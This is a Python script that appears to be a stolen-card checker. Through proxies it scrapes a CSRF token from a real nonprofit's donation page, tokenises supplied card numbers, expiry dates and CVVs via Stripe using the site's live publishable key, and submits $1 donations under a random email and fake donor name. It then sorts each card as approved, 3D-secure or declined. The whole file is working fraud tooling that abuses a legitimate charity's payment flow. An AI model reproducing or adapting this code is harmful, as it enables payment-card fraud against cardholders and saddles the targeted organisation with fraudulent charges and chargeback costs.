import random
import string
from httpx import AsyncClient
import requests


def random_email() -> str:
    return (
        "".join(random.choice(string.ascii_letters) for x in range(15))
    ) + "@gmail.com"

email = random_email()

async def stripeauth(cc, mes, ano, cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as session:
        
        req1 = await session.get('https://collectivepowerrj.org/donate-now/')
        csrf = req1.text.split("csrfToken:'")[1].split("'")[0]

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
            }

        response =  await session.post('https://m.stripe.com/6', headers=headers)
        data1 = response.json() 
        muid = data1['muid']
        sid = data1['sid']
        guid = data1['guid']


        headers = {
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2F279d7f58e7%3B+stripe-js-v3%2F279d7f58e7%3B+card-element&referrer=https%3A%2F%2Fcollectivepowerrj.org&time_on_page=23539&key=pk_live_LapaXHOCVGmqGeqBn5sm1rLO&'

        req2 = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data) # type: ignore
        tokencc = req2.json()['id']

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://collectivepowerrj.org',
            'Pragma': 'no-cache',
            'Referer': 'https://collectivepowerrj.org/donate-now/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'params': f'{{"paymentMethodID":"{tokencc}","amount":"1.00","currency":"USD","paymentProcessorID":"5","description":"Donate Now | Collective Power for Reproductive Justice","extraData":"{email};Alex;Padilla;","csrfToken":"{csrf}","captcha":""}}'
        }

        req3 = await session.post('https://collectivepowerrj.org/civicrm/ajax/api4/StripePaymentintent/ProcessPublic/',headers=headers,data=data,)
        print(req3.text)
        if "Thank You for donation" in req3.text:
            status = "Approved"
            mensaje = "Charged 1$"
        else:
            mensaje = req3.json()['error_message']
            if "Your card's security code is incorrect" in mensaje:
                status = "Approved ✅"
            elif "Your card has insufficient funds." in mensaje:
                status = "Approved ✅"
            elif "StripePayment" in req3.text:
                status = "3D ❌"
            else: 
                status = "Declined ❌"
        return status,mensaje